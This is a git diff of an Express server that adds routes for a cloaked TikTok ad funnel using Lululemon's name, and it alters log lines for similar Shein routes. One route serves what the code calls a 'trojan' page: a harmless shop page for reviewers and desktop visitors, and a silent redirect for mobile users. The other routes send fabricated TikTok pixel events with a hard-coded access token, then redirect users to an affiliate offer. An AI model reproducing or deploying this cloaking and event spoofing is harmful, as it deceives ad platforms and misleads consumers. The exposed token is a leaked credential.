@@ -403,6 +403,183 @@ app.get('/api/sephora/v1/exit', async (req, res) => {
 });
 
 
+// Lululemon TRAPI v1
+
+    // Test Lulu API Pixel Events
+app.get('/api/lulu/test/v1', async (req, res, next) => {
+    const { s1, ttclid } = req.query;
+    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const ip = extractSingleIP(ipString);
+    const user_agent = req.headers['user-agent'];
+    const event_time = Math.floor(Date.now() / 1000);
+    const external_id = hashValue(ttclid);
+    const payload = {
+        event_source: "web",
+        event_source_id: "CPERFEBC77U45REKKCJ0",
+        test_event_code: "TEST13106",
+        data: [
+            {
+                event: "ViewContent",
+                event_time: event_time,
+                user: {
+                    ttclid: ttclid,
+                    external_id: external_id,
+                    ip: ip,
+                    user_agent: user_agent
+
+                },
+                page: {
+                    url: "https://testing.com"
+                }
+            }
+        ]
+    };
+    console.log('Payload:', JSON.stringify(payload, null, 2)); // Log the payload
+    try {
+        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/event/track/', payload, {
+            headers: {
+                'Access-Token': '25d5f20ffa1eae06bf1816df84b167b32978f804',
+                'Content-Type': 'application/json'
+            }
+        });
+        console.log(`Test Event Sent. ${ttclid} ${s1}`, response.data);
+    } catch (error) {
+        console.error('Error TESTING POST request:', error);
+    }
+});
+
+// Middleware to cloak Lulu API Traffic
+app.get('/luluapi/:s1', (req, res, next) => {
+    const { s1 } = req.params;
+    const { ttclid } = req.query;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const ttclid = urlParams.get("ttclid");
+                const s1 = "${s1}";
+                const destination = \`https://tok-reward.com/api/sephora/v1/entry?s1=\${s1}&ttclid=\${ttclid}\`;
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = destination;
+                    } else {
+                    }
+            </script>
+            <title>${s1}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${s1} Shop!</h1>
+            <p>You are shopping at: ${s1}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served LuluAPI Trojan (${s1})`);
+});
+
+// Middleware to receive Lulu API Traffic (ENTRY)
+app.get('/api/lulu/v1/entry', async (req, res) => {
+    const { s1, ttclid } = req.query;
+    if (!s1 || !ttclid) {
+        return res.redirect(`https://tok-reward.com/luluapi.html?s1=paramerror`);
+    }
+    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const ip = extractSingleIP(ipString);
+    const user_agent = req.headers['user-agent'];
+    const event_time = Math.floor(Date.now() / 1000);
+    const external_id = hashValue(ttclid);
+
+    const payload = {
+        event_source: "web",
+        event_source_id: "CPERFEBC77U45REKKCJ0",
+        data: [
+            {
+                event: "ViewContent",
+                event_time: event_time,
+                user: {
+                    ttclid: ttclid,
+                    external_id: external_id,
+                    ip: ip,
+                    user_agent: user_agent
+
+                },
+                page: {
+                    url: "https://tok-reward.com"
+                }
+            }
+        ]
+    };
+    
+    try {
+        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/event/track/', payload, {
+            headers: {
+                'Access-Token': '25d5f20ffa1eae06bf1816df84b167b32978f804',
+                'Content-Type': 'application/json'
+            }
+        });
+
+        console.log(`LPV Posted (${s1})`);
+        res.redirect(`https://tok-reward.com/luluapi.html?s1=${s1}&ttclid=${ttclid}`);
+    } catch (error) {
+        console.error('Error making entry POST request', error);
+        res.redirect(`https://tok-reward.com/luluapi.html?s1=entryposterror`);
+    }
+});
+
+
+// Middleware to receive Lulu API Traffic (EXIT)
+app.get('/api/lulu/v1/exit', async (req, res) => {
+    const { s1, ttclid } = req.query;
+    if (!s1 || !ttclid) {
+        return res.redirect('https://glitchy.go2cloud.org/aff_c?offer_id=463&aff_id=2159');
+    }
+    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const ip = extractSingleIP(ipString);
+    const user_agent = req.headers['user-agent'];
+    const event_time = Math.floor(Date.now() / 1000);
+    const external_id = hashValue(ttclid);
+
+   const payload = {
+        event_source: "web",
+        event_source_id: "CPERFEBC77U45REKKCJ0",
+        data: [
+            {
+                event: "AddToCart",
+                event_time: event_time,
+                user: {
+                    ttclid: ttclid,
+                    external_id: external_id,
+                    ip: ip,
+                    user_agent: user_agent
+                },
+                page: {
+                    url: "https://tok-reward.com"
+                }
+            }
+        ]
+    };
+
+    try {
+        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/event/track/', payload, {
+            headers: {
+                'Access-Token': '25d5f20ffa1eae06bf1816df84b167b32978f804',
+                'Content-Type': 'application/json'
+            }
+        });
+
+        console.log(`CTR Posted (${s1})`);
+        res.redirect(`https://glitchy.go2cloud.org/aff_c?offer_id=463&aff_id=2159&source=${s1}`);
+    } catch (error) {
+        console.error('Error making exit POST request:', error);
+        res.redirect(`https://glitchy.go2cloud.org/aff_c?offer_id=463&aff_id=2159&source=exitposterror`);
+    }
+});
 
 
 
@@ -595,7 +772,7 @@ app.get('/jshein/:slug', (req, res, next) => {
         </html>
             `;
             res.send(trojanHTML);
-            console.log(`Served twshein Trojan (tyler)(${slug})`);
+            console.log(`Served shein Trojan (jay)(${slug})`);
 });
 
 // Middleware to pass on Jay's SubIDs SHEIN D2O
@@ -628,7 +805,7 @@ app.get('/jsheindir/:slug', (req, res, next) => {
         </html>
             `;
             res.send(trojanHTML);
-            console.log(`Served twshein Trojan (tyler)(${slug})`);
+            console.log(`Served sheindirect Trojan (jay)(${slug})`);
 });
 
 // Middleware to pass on Tyler's SubIDs MY LANDER
